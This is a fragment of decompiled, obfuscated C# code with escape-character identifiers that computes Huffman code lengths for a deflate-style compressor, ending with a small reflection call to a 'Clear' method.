      \u0006.\u0004.\u0001(obj1.\u0001, obj1.\u0003);
      \u0006.\u0004.\u0001(obj1.\u0002, obj1.\u0003);
    }

    static void \u0001(int[] _param0, [In] \u0003.\u0003.\u0007.\u0001 obj1)
    {
      obj1.\u0001 = new byte[obj1.\u0001.Length];
      int length = _param0.Length / 2;
      int num1 = (length + 1) / 2;
      int num2 = 0;
      for (int index = 0; index < obj1.\u0003; ++index)
        obj1.\u0001[index] = 0;
      int[] numArray1 = new int[length];
      numArray1[length - 1] = 0;
      for (int index = length - 1; index >= 0; --index)
      {
        if (_param0[2 * index + 1] != -1)
        {
          int num3 = numArray1[index] + 1;
          if (num3 > obj1.\u0003)
          {
            num3 = obj1.\u0003;
            ++num2;
          }
          numArray1[_param0[2 * index]] = numArray1[_param0[2 * index + 1]] = num3;
        }
        else
        {
          int num4 = numArray1[index];
          ++obj1.\u0001[num4 - 1];
          obj1.\u0001[_param0[2 * index]] = (byte) numArray1[index];
        }
      }
      if (num2 == 0)
        return;
      int index1 = obj1.\u0003 - 1;
      do
      {
        do
          ;
        while (obj1.\u0001[--index1] == 0);
        do
        {
          --obj1.\u0001[index1];
          int[] numArray2;
          int[] numArray3 = numArray2 = obj1.\u0001;
          int index2;
          index1 = index2 = index1 + 1;
          int index3 = index2;
          int num5 = numArray3[(IntPtr) index3] + 1;
          numArray2[index2] = num5;
          num2 -= 1 << obj1.\u0003 - 1 - index1;
        }
        while (num2 > 0 && index1 < obj1.\u0003 - 1);
      }
      while (num2 > 0);
      obj1.\u0001[obj1.\u0003 - 1] += num2;
      obj1.\u0001[obj1.\u0003 - 2] -= num2;
      int num6 = 2 * num1;
      for (int index4 = obj1.\u0003; index4 != 0; --index4)
      {
        int num7 = obj1.\u0001[index4 - 1];
        while (num7 > 0)
        {
          int index5 = 2 * _param0[num6++];
          if (_param0[index5 + 1] == -1)
          {
            obj1.\u0001[_param0[index5]] = (byte) index4;
            --num7;
          }
        }
      }
    }

    static void \u0001([In] \u0004.\u0003 obj0) => obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
  }
}
